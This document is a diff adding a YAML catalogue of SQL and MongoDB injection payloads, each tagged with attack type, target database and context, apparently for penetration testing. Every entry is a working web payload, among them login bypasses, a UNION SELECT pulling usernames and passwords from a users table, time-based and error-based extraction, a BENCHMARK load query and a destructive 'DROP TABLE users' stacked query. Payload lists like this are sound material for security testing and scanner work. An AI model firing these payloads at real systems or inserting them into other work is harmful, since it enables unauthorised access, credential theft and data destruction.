@@ -1,0 +1,148 @@
+# SQL Injection Payloads with Metadata
+# Usage: Filter by type, dbms, or context for targeted testing
+
+payloads:
+  # Boolean-based blind
+  - payload: "' OR '1'='1'--"
+    type: boolean-blind
+    dbms: [mysql, postgres, mssql, oracle, sqlite]
+    context: [login, search, filter, where-clause]
+
+  - payload: "' OR '1'='1'/*"
+    type: boolean-blind
+    dbms: [mysql, postgres]
+    context: [login, search, filter]
+
+  - payload: "\" OR \"1\"=\"1\"--"
+    type: boolean-blind
+    dbms: [mysql, postgres, mssql]
+    context: [login, search, double-quoted]
+
+  - payload: "' OR 1=1--"
+    type: boolean-blind
+    dbms: [mysql, postgres, mssql, sqlite]
+    context: [login, search, filter]
+
+  - payload: "' OR 'a'='a"
+    type: boolean-blind
+    dbms: [mysql, postgres, mssql, oracle, sqlite]
+    context: [login, search]
+
+  - payload: "') OR ('1'='1"
+    type: boolean-blind
+    dbms: [mysql, postgres, mssql]
+    context: [login, parenthesized-query]
+
+  - payload: "' AND 1=1--"
+    type: boolean-blind
+    dbms: [mysql, postgres, mssql, sqlite]
+    context: [verification, confirm-injectable]
+
+  - payload: "' AND 1=2--"
+    type: boolean-blind
+    dbms: [mysql, postgres, mssql, sqlite]
+    context: [verification, confirm-injectable]
+
+  # Union-based
+  - payload: "1' ORDER BY 1--"
+    type: union-column-count
+    dbms: [mysql, postgres, mssql, sqlite]
+    context: [data-extraction, column-enumeration]
+
+  - payload: "1' UNION SELECT NULL--"
+    type: union-based
+    dbms: [mysql, postgres, mssql, sqlite]
+    context: [data-extraction]
+
+  - payload: "1' UNION SELECT NULL,NULL--"
+    type: union-based
+    dbms: [mysql, postgres, mssql, sqlite]
+    context: [data-extraction]
+
+  - payload: "1' UNION SELECT NULL,NULL,NULL--"
+    type: union-based
+    dbms: [mysql, postgres, mssql, sqlite]
+    context: [data-extraction]
+
+  - payload: "' UNION SELECT username,password FROM users--"
+    type: union-based
+    dbms: [mysql, postgres, mssql, sqlite]
+    context: [data-extraction, credential-theft]
+
+  # Version detection
+  - payload: "' AND SUBSTRING(@@version,1,1)='5'--"
+    type: boolean-blind
+    dbms: [mysql, mssql]
+    context: [fingerprinting, version-detection]
+
+  - payload: "' AND (SELECT COUNT(*) FROM users)>0--"
+    type: boolean-blind
+    dbms: [mysql, postgres, mssql, sqlite]
+    context: [enumeration, table-existence]
+
+  # Auth bypass
+  - payload: "admin'--"
+    type: auth-bypass
+    dbms: [mysql, postgres, mssql, sqlite]
+    context: [login, authentication]
+
+  # Time-based blind
+  - payload: "' WAITFOR DELAY '0:0:5'--"
+    type: time-blind
+    dbms: [mssql]
+    context: [blind-detection, time-based]
+
+  - payload: "'; SELECT pg_sleep(5)--"
+    type: time-blind
+    dbms: [postgres]
+    context: [blind-detection, time-based]
+
+  - payload: "' AND SLEEP(5)--"
+    type: time-blind
+    dbms: [mysql]
+    context: [blind-detection, time-based]
+
+  # Error-based
+  - payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--"
+    type: error-based
+    dbms: [mysql]
+    context: [data-extraction, version-detection]
+
+  - payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--"
+    type: error-based
+    dbms: [mysql]
+    context: [data-extraction, user-detection]
+
+  # Heavy query (DoS detection)
+  - payload: "' OR BENCHMARK(5000000,MD5('test'))--"
+    type: heavy-query
+    dbms: [mysql]
+    context: [dos-detection, time-based]
+
+  # Destructive (use with caution)
+  - payload: "1; DROP TABLE users--"
+    type: stacked-query
+    dbms: [mssql, postgres]
+    context: [destructive, stacked-queries]
+    warning: "DESTRUCTIVE - only use in test environments"
+
+  # NoSQL (MongoDB)
+  - payload: '{"$ne": ""}'
+    type: nosql-operator
+    dbms: [mongodb]
+    context: [login, auth-bypass, filter]
+
+  - payload: '{"$gt": ""}'
+    type: nosql-operator
+    dbms: [mongodb]
+    context: [login, auth-bypass, filter]
+
+  - payload: '{"$regex": ".*"}'
+    type: nosql-regex
+    dbms: [mongodb]
+    context: [enumeration, data-extraction]
+
+  - payload: '{"$where": "1==1"}'
+    type: nosql-javascript
+    dbms: [mongodb]
+    context: [auth-bypass, code-execution]
